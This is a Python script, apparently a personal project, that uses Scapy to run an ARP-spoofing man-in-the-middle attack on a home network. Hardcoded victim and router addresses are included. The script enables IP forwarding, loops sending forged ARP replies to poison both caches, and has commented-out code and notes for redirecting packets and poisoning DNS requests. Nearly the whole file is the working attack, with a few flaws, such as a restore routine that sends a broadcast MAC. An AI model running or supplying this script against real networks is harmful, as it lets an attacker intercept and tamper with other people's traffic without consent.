# from scapy.all import *
# # iphone mac 0a:d6:89:76:ea:2a 

# bebo_mac = "0a:d6:89:76:ea:2a"
# bebo_ip = "192.168.100.4"

# broadcast_mac_dest = "ff:ff:ff:ff:ff:ff"
# dest_ip = "192.168.100.1"

# ethernet_frame = Ether(src=bebo_mac, dst=broadcast_mac_dest)
# ip_layer = IP(src=bebo_ip, dst=dest_ip)
# icmp_packet = ICMP()

# packet = ethernet_frame / ip_layer / icmp_packet

# sendp(packet)


from scapy.all import *
import os
import sys
import time

iface  = "wlo1" # depends on router
victim_ip  = "192.168.100.4" # from user input
router_ip  = "192.168.100.1" # depends on the router
router_mac = ""
victim_mac = "0a:d6:89:76:ea:2a"
gateway_mac= "ff:ff:ff:ff:ff:ff"
attacker_mac="f8:54:f6:81:05:31"

def help_hext():
    print("forgot arguments!")
    sys.exit(1)

def enable_ip_forwarding():
    print("\nenabling ip forwarding...\n")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ip_forwarding():
    print("\ndisabling ip forwarding...\n")
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def get_mac(IP):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=5)
    for s,r in ans:
        return r[Ether].src
    return None

def overview():    
    print("victim ip:", victim_ip)
    print("victim mac:", victim_mac)
    print("\nrouter ip:", router_ip)
    print("router mac:", router_mac)
    print("\nattacker ip: <nobody cares>")
    print("attacker mac:", attacker_mac)

def spoof():
    if router_mac is None:
        print("router mac wasn't found")
        sys.exit(1)
    sendp(Ether(dst=router_mac)/ARP(op = 2,
             hwsrc=attacker_mac, 
             hwdst=router_mac,
             psrc=victim_ip,
             pdst=router_ip), iface="wlo1", count=1)

    if victim_mac is None:
        print("victim mac wasn't found")
        sys.exit(1)
    sendp(Ether(dst=victim_mac)/ARP(op = 2,
             hwsrc=attacker_mac, 
             hwdst=victim_mac,
             psrc=router_ip,
             pdst=victim_ip), iface="wlo1", count=1)

def restore():
    send(Ether(dst=router_mac)/ARP(op = 2, pdst = router_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = "0a:d6:89:76:ea:2a"), count = 1)
    send(Ether(dst=victim_mac)/ARP(op = 2, pdst = victim_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 1)
    disable_ip_forwarding()

def handle_packet(packet):
    if (packet[IP].dst == router_ip) and (packet[Ether].dst == attacker_mac):
        packet[Ether].dst = gateway_mac
        sendp(packet)
        print("A packet from " + packet[IP].src + " redirected!")

def mitm():
    while 1:
        try:
            spoof()
            time.sleep(5)
        except KeyboardInterrupt:
            restore()
            break



# if len(sys.argv) < 2:
#     help_hext()
# iface = sys.argv[1]
# victimIP = sys.argv[2]
# gatewayIP = sys.argv[3]

enable_ip_forwarding()

for i in range(1, 3):
    if victim_mac is None:
        victim_mac = get_mac(victim_ip)
    time.sleep(1)
if victim_mac is None:
    sys.exit(1)

router_mac = get_mac(router_ip)
time.sleep(2)

overview()
mitm()

# this should forward traffic
# sniff(prn=handle_packet, filter="ip", iface=iface, store=0)

# arp spoof (done)

# forward traffic
# if we catch a dns request poison it
